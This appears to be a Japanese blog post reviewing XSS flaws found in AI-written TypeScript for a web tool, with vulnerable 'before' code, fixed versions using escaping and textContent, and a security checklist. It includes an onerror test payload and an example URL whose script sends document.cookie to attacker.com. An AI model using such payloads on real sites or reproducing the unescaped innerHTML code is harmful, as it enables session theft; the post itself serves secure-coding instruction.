# 【コードレビュー】AIが書いたコードに潜むDOM XSS脆弱性3選と、それを潰した修正の全記録

## はじめに

「AIにコードを書かせたら、爆速でWebアプリが完成した！」
SNSなどでこうした成果をよく見かけるようになりました。

しかし、**「AIが生成したコードのセキュリティ品質を、人間がどこまで検証できているか」**という点については、大きな懸念が存在します。

実際、「AI開発初心者ナビ」の初期実装完了後にコードレビュー監査を実施したところ、機能的には100%動いているにもかかわらず、**深刻なDOM XSS（クロスサイトスクリプティング）脆弱性が3箇所**も検出されました。

本記事では、AIが生成しがちな脆弱なコードパターンと、それをどのように安全な実装へ修正したのか、実際のDiffを交えて全記録を公開します。

---

## 脆弱性1：履歴画面における `innerHTML` インジェクション

### 潜んでいた問題
本アプリには、過去に作成したプロンプトや検索履歴を一覧表示・インポートするモーダル画面（`history-modal.ts`）があります。
AIが最初に書いたコードは、テンプレートリテラルでHTML文字列を組み立て、そのまま `innerHTML` に代入していました。

```typescript
// ❌ 修正前（危険なコード）
modal.innerHTML = `
  <div class="history-item">
    <h4>${item.title}</h4>
    <p>${item.summary}</p>
    <span class="timestamp">${item.timestamp}</span>
  </div>
`;
```

### なぜ危険なのか？
もしユーザーが悪意あるWebサイトから「配布された履歴JSONファイル」をインポートしたり、検索欄に `<img src=x onerror=alert(1)>` のようなスクリプトを含めて履歴に残していた場合、モーダルを開いた瞬間に任意のJavaScriptが実行されてしまいます。

### 修正内容：厳格なHTMLエスケープの徹底
動的データ（title, summary, timestamp, id）をすべてエスケープ関数に通してから展開するように修正しました。

```typescript
// ⭕ 修正後
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

modal.innerHTML = `
  <div class="history-item">
    <h4>${escapeHtml(item.title)}</h4>
    <p>${escapeHtml(item.summary)}</p>
    <span class="timestamp">${escapeHtml(item.timestamp)}</span>
  </div>
`;
```

---

## 脆弱性2：URLハッシュ経由のDOM XSS（404画面）

### 潜んでいた問題
ハッシュベースの簡易ルーター（`#plugin/xxx`）で、存在しないプラグインIDが指定された際のエラー表示処理（`main.ts`）に隙がありました。

```typescript
// ❌ 修正前（危険なコード）
const plugin = registry.getById(pluginId);
if (!plugin) {
  contentArea.innerHTML = `
    <div class="not-found">
      <p>プラグイン「${pluginId}」は見つかりませんでした。</p>
    </div>
  `;
  return;
}
```

### なぜ危険なのか？
攻撃者が被害者に `https://example.com/#plugin/<script>fetch('http://attacker.com?c='+document.cookie)</script>` のようなURLを踏ませることで、URL文字列が直接DOMへ展開され、即座にXSSが発動します。

### 修正内容：`innerHTML` を全廃し、`textContent` によるDOM構築
URLパラメータなどの外部から操作可能な値は、文字列展開を一切行わず、ブラウザ標準のDOM API（`createElement` / `textContent`）を使って構築するのが最も確実な防御策です。

```typescript
// ⭕ 修正後
const plugin = registry.getById(pluginId);
if (!plugin) {
  const notFound = document.createElement('div');
  notFound.className = 'not-found';

  const message = document.createElement('p');
  // textContent を使うことで、HTMLタグが含まれていても単なる文字列として安全に描画される
  message.textContent = `プラグイン「${pluginId}」は見つかりませんでした。`;

  notFound.appendChild(message);
  contentArea.replaceChildren(notFound);
  return;
}
```

---

## 脆弱性3：要約プレビュー欄でのサニタイズ漏れ

### 潜んでいた問題
機密情報（APIキー等）をマスキングするサニタイザーを実装していたにもかかわらず、プロンプト生成ボックス（`prompt-box.ts`）において、**メインの入力欄はマスクされていたが、要約（Summary）要素だけが素通しになっていた**というミスです。

```typescript
// ❌ 修正前
this.summaryEl.textContent = rawSummary; // APIキーが生で画面に露出する！
```

UIの特定パーツだけマスキング関数を通し忘れるというミスは、AIも人間も非常によくやらかす「盲点」です。

### 修正内容
```typescript
// ⭕ 修正後
const sanitizedSummary = sanitizePrompt(rawSummary).maskedText;
this.summaryEl.textContent = sanitizedSummary;
```

---

## おまけ：画面遷移時のタイマー未解放によるメモリリーク

セキュリティレビューの過程で、もう一つの品質課題が発見されました。
検索バーコンポーネント（`search-bar.ts`）内で、入力遅延処理（`debounceTimer`）とプレースホルダーのアニメーション（`setInterval`）を回していたのですが、**画面遷移時にこれらのタイマーを破棄（destroy）していなかった**のです。

画面を行き来するたびにバックグラウンドで不要な `setInterval` が増殖し、ブラウザのメモリを圧迫し続けるバグでした。

```typescript
// ⭕ 修正後：画面遷移（onRouteChange）の冒頭で確実に解放
if (searchBarInstance) {
  searchBarInstance.destroy();
  searchBarInstance = null;
}
```

---

## AIコーディングにおけるセキュリティの鉄則

今回の経験から得られた、AIにコードを書かせる際のセキュリティチェックリストです。

1. **`innerHTML` を見たらまず疑う**
   - ユーザー入力、URLパラメータ、外部ストレージの値が混ざっていないか？
   - 原則として `textContent` または `createElement` で組み立てる。
2. **URLパラメータ（クエリ・ハッシュ）は汚染源とみなす**
   - 「ローカルツールだから安全」と思い込まず、URLから渡される文字列はすべて無害化する。
3. **「全体」ではなく「境界」をテストする**
   - 正常系の入力だけでなく、`<script>` や `onerror` を含んだ文字列、不正なJSONを流し込んで自動テストを書く。

AIは「動くコード」を驚異的なスピードで書いてくれますが、「攻撃者の視点に立った安全なコード」にする最後の砦は、依然としてエンジニアのレビュー眼です。

次回は、非エンジニアへの配布で直面した**「Windowsバッチファイル（.bat）の文字コードとローカル起動の泥臭い戦い」**をお届けします。
